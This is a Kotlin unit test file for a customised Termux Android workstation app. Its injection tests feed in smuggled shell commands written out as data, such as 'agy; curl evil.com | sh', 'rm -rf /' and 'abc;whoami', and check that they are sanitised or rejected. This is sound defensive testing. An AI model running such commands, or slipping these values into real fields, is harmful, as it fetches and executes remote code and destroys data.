package com.termux.custom

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.termux.custom.data.AgentSessionRecord
import com.termux.custom.data.LocalFirstCrdtDatabase
import com.termux.custom.provisioning.CustomBootstrapProvisioner
import com.termux.custom.security.AntigravityTokenWarden
import com.termux.custom.ui.WorkstationFormFactor
import com.termux.custom.ui.resolveFormFactor
import com.termux.shared.termux.TermuxConstants
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.UnconfinedTestDispatcher
import kotlinx.coroutines.test.runTest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@OptIn(ExperimentalCoroutinesApi::class)
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [28])
class TermuxWorkstationCustomLayerTest {

    private val testDispatcher = UnconfinedTestDispatcher()

    @Test
    fun `immutable invariants preserve com_termux prefix and targetSdkVersion 28`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        assertEquals("com.termux", context.packageName)
        assertEquals("/data/data/com.termux/files/usr", TermuxConstants.TERMUX_PREFIX_DIR_PATH)
        assertEquals(28, context.applicationInfo.targetSdkVersion)
    }

    @Test
    fun `resolveFormFactor classifies phone portrait, phone landscape, tablet portrait, and tablet landscape accurately`() {
        // Redmi Note 13 Pro Portrait (392x872dp)
        assertEquals(WorkstationFormFactor.PHONE_PORTRAIT, resolveFormFactor(392, 872))
        // Redmi Note 13 Pro Landscape (872x392dp) — must NOT be misclassified as Tablet!
        assertEquals(WorkstationFormFactor.PHONE_LANDSCAPE, resolveFormFactor(872, 392))
        // Xiaomi Pad 6 Portrait (720x1152dp)
        assertEquals(WorkstationFormFactor.TABLET_PORTRAIT, resolveFormFactor(720, 1152))
        // Xiaomi Pad 6 Landscape 120Hz (1152x720dp)
        assertEquals(WorkstationFormFactor.TABLET_LANDSCAPE, resolveFormFactor(1152, 720))
    }

    @Test
    fun `CustomBootstrapProvisioner refuses to touch prefix when bootstrap sh is not installed`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        assertFalse(CustomBootstrapProvisioner.isBootstrapInstalled())
        assertFalse(CustomBootstrapProvisioner.provisionSynchronously(context))
    }

    @Test
    fun `CRDT database increments Lamport clock, neutralizes shell injection, and merges remote P2P deltas`() = runTest(testDispatcher) {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val db = LocalFirstCrdtDatabase(context, testDispatcher)

        val created = db.upsertSession(
            id = "session-pad6",
            title = "agy-pad6-120hz",
            agentType = "agy",
            compactedSummary = "Initial context on Xiaomi Pad 6",
            contextTokens = 2048,
        )
        assertEquals(1L, created.lamportVersion)
        assertEquals(1, db.sessionsFlow.value.size)

        // Malicious remote P2P delta attempting shell injection in agentType & id
        val maliciousDeltaJson = """
            {
              "siteId": "node-redmi13pro",
              "exportedAt": 1795300000000,
              "deltas": [
                {
                  "deltaId": "node-redmi13pro:5:session-pad6",
                  "entityId": "session-pad6",
                  "siteId": "node-redmi13pro",
                  "lamportClock": 5,
                  "hlcTimestamp": 1795300000100,
                  "operation": "UPSERT",
                  "payload": {
                    "id": "session-pad6; rm -rf /",
                    "title": "agy-pad6-120hz-merged",
                    "agentType": "agy; curl evil.com | sh",
                    "workingDir": "/data/data/com.termux/files/home",
                    "compactedSummary": "Compacted on Redmi Note 13 Pro via P2P delta",
                    "contextTokens": 4096,
                    "lamportVersion": 5,
                    "siteId": "node-redmi13pro",
                    "updatedAt": 1795300000100,
                    "isDeleted": false
                  }
                }
              ]
            }
        """.trimIndent()

        val applied = db.mergeRemoteDeltaBundleJson(maliciousDeltaJson)
        assertEquals(1, applied)
        val merged = db.sessionsFlow.value.first { it.title == "agy-pad6-120hz-merged" }
        // Injection neutralized by allowlist + regex sanitization
        assertEquals("agy", merged.agentType)
        assertFalse(merged.toSafeLaunchCommand().contains(";"))
        assertFalse(merged.toSafeLaunchCommand().contains("|"))

        // Tombstone soft-delete hides from active sessions but records delta
        db.softDeleteSession(created.id)
        val exportedAfterTombstone = db.exportDeltaBundleJson(0L)
        assertTrue(exportedAfterTombstone.contains("TOMBSTONE"))

        db.close()
    }

    @Test
    fun `AntigravityTokenWarden rejects whitespace tokens, locks 0600, and revokes cleanly`() = runTest(testDispatcher) {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val warden = AntigravityTokenWarden(context, testDispatcher)

        val invalidResult = warden.provisionOrSyncToken("bad token\nrm -rf /")
        assertTrue(invalidResult.isFailure)

        val result = warden.provisionOrSyncToken("ya29.a0AfB_byAntigravityOAuthTokenTest998877")
        assertTrue(result.isSuccess)
        val state = result.getOrThrow()
        assertTrue(state.isPresent)
        assertEquals("0600", state.posixModeOctal)
        assertTrue(state.maskedPreview.startsWith("ya29"))

        val revoked = warden.revokeLocalToken()
        assertFalse(revoked.isPresent)
    }

    @Test
    fun `AgentSessionRecord allowlists launch command against injection`() {
        val record = AgentSessionRecord(
            id = "abc;whoami",
            title = "test",
            agentType = "rm -rf /",
            workingDir = "/tmp",
            compactedSummary = "",
            contextTokens = 0,
            lamportVersion = 1L,
            siteId = "node-1",
            updatedAt = 0L,
            isDeleted = false,
        )
        assertEquals("agy --resume abcwhoami", record.toSafeLaunchCommand())
    }

    @Test
    fun `GitHubReleaseUpdater compares melcat tags accurately and resolves ABI-specific APK`() {
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.4"))
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.9", "v0.119.0-melcat.1"))
        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.3"))
        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.4", "v0.118.0-melcat.3"))

        val releaseJson = """
            {
              "tag_name": "v0.118.0-melcat.4",
              "name": "v0.118.0-melcat.4 — OTA Test",
              "body": "Auto update test",
              "html_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/tag/v0.118.0-melcat.4",
              "assets": []
            }
        """.trimIndent()
        val parsed = com.termux.custom.updater.GitHubReleaseUpdater.parseLatestReleaseJson(
            releaseJson,
            listOf("arm64-v8a", "armeabi-v7a"),
        )
        assertEquals("v0.118.0-melcat.4", parsed.tagName)
        assertEquals("arm64-v8a", parsed.matchedAbi)
        assertTrue(parsed.apkDownloadUrl.contains("v0.118.0-melcat.4"))
        assertTrue(parsed.sha256Url!!.endsWith(".sha256"))
    }

    @Test
    fun tutorialProgressStorePersistsValidStepsAndAutoOffer() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val store = com.termux.custom.ui.TutorialProgressStore
        store.reset(context)

        assertTrue(store.shouldAutoOffer(context))
        assertEquals(0f, store.computeProgressFraction(emptySet()), 0.0001f)

        val filtered = store.filterValidIds(setOf("arm64_engine_setup", "bogus_step_id"))
        assertEquals(setOf("arm64_engine_setup"), filtered)

        val afterFirst = store.setStepCompleted(context, com.termux.custom.ui.TutorialStep.ARM64_ENGINE_SETUP, true)
        assertEquals(setOf("arm64_engine_setup"), afterFirst)
        assertEquals(1f / com.termux.custom.ui.TutorialStep.entries.size, store.computeProgressFraction(afterFirst), 0.0001f)

        store.setAutoOffered(context, true)
        assertFalse(store.shouldAutoOffer(context))

        val reloaded = store.loadCompletedIds(context)
        assertEquals(setOf("arm64_engine_setup"), reloaded)

        val afterUncheck = store.setStepCompleted(context, com.termux.custom.ui.TutorialStep.ARM64_ENGINE_SETUP, false)
        assertTrue(afterUncheck.isEmpty())
    }

    @Test
    fun shieldScoreAlignsWithFiveChecklistItems() {
        val baseGuardian = com.termux.custom.guardian.GuardianStatus(
            isServiceRunning = true,
            wakeLockHeld = true,
            wifiLockHeld = true,
            batteryOptimizationIgnored = true,
            isHyperOsOrMiui = true,
            maxPhantomProcesses = "2147483647",
            adbPhantomFixCommand = "adb shell ...",
        )
        val missingToken = com.termux.custom.security.OAuthTokenState(
            isPresent = false,
            maskedPreview = "Not configured",
            fingerprintSha256 = "none",
            posixModeOctal = "----",
            storagePath = "",
            syncedCliTargets = emptyList(),
        )
        // Missing OAuth token must NOT reach 100% even if phantomShielded is true
        assertEquals(80, com.termux.custom.ui.computeShieldScore(true, baseGuardian, missingToken))

        val activeToken = missingToken.copy(isPresent = true, posixModeOctal = "0600")
        assertEquals(100, com.termux.custom.ui.computeShieldScore(true, baseGuardian, activeToken))
    }
}

